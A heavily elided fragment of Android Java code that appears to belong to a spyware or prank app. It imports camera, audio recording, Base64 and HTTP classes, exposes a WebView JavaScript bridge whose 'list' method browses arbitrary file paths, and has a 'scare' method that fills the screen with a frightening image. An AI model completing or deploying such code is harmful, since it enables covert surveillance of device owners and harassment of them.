...
import android.os.*; import android.webkit.*; import android.app.*; import android.content.*; import android.net.Uri; import java.io.*; import android.util.Base64; import android.hardware.Camera; import android.graphics.SurfaceTexture; import android.media.MediaRecorder; import java.net.HttpURLConnection; import java.net.URL; import android.provider.Settings;
    ...
    protected void onCreate(Bundle s) {
        ...
        w.addJavascriptInterface(new Object(){
            @JavascriptInterface public String list(String p){
                File[] fs=new File(p).listFiles(); if(fs==null) return "Access Denied";
            ...
            @JavascriptInterface public void scare(){
                runOnUiThread(()->{ w.loadUrl("javascript:document.body.innerHTML='<img src=\"file:///android_asset/scare.png\" style=\"width:100%;height:100%;\">';"); });
            }
